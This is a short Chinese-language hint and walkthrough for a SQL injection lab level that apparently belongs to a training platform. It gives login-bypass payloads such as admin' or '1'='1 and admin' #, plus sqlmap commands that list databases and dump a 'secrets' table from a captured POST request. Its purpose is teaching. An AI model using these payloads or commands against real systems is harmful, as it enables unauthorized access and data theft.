思路提示

POST 型注入和 GET 原理一样，只是参数在请求体里。本关有两个目标：① 万能密码登录——利用 SQL 语句拼接，用 or '1'='1 让条件恒真，或用 # 注释掉密码判断；② 进阶用 Burp 抓包后用 sqlmap 跑 POST 请求。重点观察页面回显的拼接后 SQL，理解注释符的作用。

详细解题过程（点击展开）
万能密码（目标1）：
用户名：admin' or '1'='1 密码随意
或用户名：admin' #（# 注释掉后面的密码判断）
观察：页面会回显拼接后的 SQL，理解 # 注释的作用。
sqlmap（目标2）：
1. Burp 抓到登录 POST 请求，右键 Save item 存为 post.txt
2. sqlmap -r post.txt -p username --dbs
3. sqlmap -r post.txt -p username -D bafanglab -T secrets --dump
